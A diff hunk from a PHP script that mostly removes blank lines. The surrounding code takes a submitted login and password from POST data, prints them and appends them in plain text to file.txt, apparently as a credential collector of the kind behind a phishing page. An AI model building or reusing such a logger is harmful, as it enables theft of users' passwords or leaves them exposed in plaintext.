@@ -10,29 +10,19 @@ print_r($_POST);
    
    //  $data = 'NAME -> ' .$destring['name'] ."\n". 'EMAIL -> ' .$destring['email'] ."\n". 'PHONE -> ' .$destring['phone'];
 
-
      $data = 'id -> ' .$destring['login'] . ' | hash -> ' .$destring['pass'];
 
-
-
-
-
      print ' ---------------------------'."\n";
-
 
      echo $data;
 
     // print $destring['email'];
-
-
 
   print '<br>';
   print ' ---------------------------'."\n";
  // echo $dat;
  // print_r($destring);
   print '</pre>';
-
-  
 
   $f = fopen('file.txt', 'a');
   fwrite($f, $data . PHP_EOL);
